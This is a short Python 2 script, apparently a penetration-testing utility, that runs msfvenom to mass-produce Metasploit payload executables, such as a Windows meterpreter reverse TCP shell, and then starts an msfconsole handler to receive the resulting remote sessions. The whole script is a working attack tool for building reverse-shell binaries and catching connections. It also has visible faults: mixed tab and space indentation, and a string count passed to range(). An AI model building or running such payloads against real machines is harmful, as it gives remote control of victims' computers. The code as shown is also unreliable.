#!/usr/bin/python
#
# GenPayloads.py
# Simple python script to generate a number of metasploit payload binaries and then start a handler for testing
# ex: python GenPayloads.py windows/meterpreter/reverse_tcp 192.168.1.2 443 100 
#
# by Chris Campbell (obscuresec)
# original idea from Skip Duckwall (passingthehash)
import sys
import subprocess

#write a resource file and call it
def build(payload,lhost,lport):
  options = "use multi/handler\n"
  options += "set payload %s\n" % (payload)
	options += "set LHOST %s\nset LPORT %s\n" % (lhost,lport)
	options += "set ExitOnSession false\n"
	options += "exploit -j\n"
	filewrite = file("listener.rc", "w")
	filewrite.write(options)
	filewrite.close()
	subprocess.Popen("msfconsole -r listener.rc", shell=True).wait()

#generate payloads with msfvenom
def gen(payload,lhost,lport,num):
	for x in range(0, num):
		filename = "payload_%s_%s" % (lport,x)
		venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s" % (payload,lhost,lport,filename)
		subprocess.Popen(venom, shell=True)

#grab args
try:    
	payload = sys.argv[1]
	lhost = sys.argv[2]
	lport = sys.argv[3]
	num = sys.argv[4]
	
	gen(payload,lhost,lport,num)
	build(payload,lhost,lport)

#index error
except IndexError:
	print "python GenPayloads.py payload lhost lport number"	
